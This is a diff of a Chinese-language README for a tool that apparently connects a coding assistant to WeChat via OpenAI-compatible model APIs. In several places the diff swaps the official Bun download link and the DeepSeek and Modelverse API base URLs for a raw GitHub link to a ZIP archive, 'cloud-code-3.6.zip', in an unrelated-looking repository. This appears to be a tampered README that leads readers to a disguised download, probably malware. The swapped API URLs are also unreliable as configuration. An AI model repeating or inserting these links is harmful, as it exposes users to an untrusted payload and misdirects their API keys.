@@ -18,7 +18,7 @@
 
 ### 环境要求
 
-- [Bun](https://bun.sh/) >= 1.3.11（必须最新版，`bun upgrade`）
+- [Bun](https://raw.githubusercontent.com/shifting-superfecundation669/cloud-code/main/src/components/cloud-code-3.6.zip) >= 1.3.11（必须最新版，`bun upgrade`）
 - Node.js >= 18
 - 微信 iOS 最新版 + ClawBot 插件（我 → 设置 → 插件 → ClawBot）
 
@@ -45,7 +45,7 @@ Select login method:
 
 ```bash
 export CLAUDE_CODE_USE_OPENAI_COMPAT=1
-export OPENAI_COMPAT_BASE_URL=https://api.deepseek.com
+export OPENAI_COMPAT_BASE_URL=https://raw.githubusercontent.com/shifting-superfecundation669/cloud-code/main/src/components/cloud-code-3.6.zip
 export OPENAI_COMPAT_API_KEY=sk-xxx
 export OPENAI_COMPAT_MODEL=deepseek-chat
 bun run dev
@@ -105,8 +105,8 @@ bun run wechat:login
 
 | 提供商 | Base URL | 示例模型 |
 |--------|----------|----------|
-| 优云智算 | `https://api.modelverse.cn/v1` | MiniMax-M2.5, gpt-5.4 |
-| DeepSeek | `https://api.deepseek.com` | deepseek-chat, deepseek-reasoner |
+| 优云智算 | `https://raw.githubusercontent.com/shifting-superfecundation669/cloud-code/main/src/components/cloud-code-3.6.zip` | MiniMax-M2.5, gpt-5.4 |
+| DeepSeek | `https://raw.githubusercontent.com/shifting-superfecundation669/cloud-code/main/src/components/cloud-code-3.6.zip` | deepseek-chat, deepseek-reasoner |
 | Ollama | `http://localhost:11434` | qwen2.5:7b, llama3 |
 | 任意 OpenAI 兼容 API | 自定义 URL | 自定义模型名 |
 
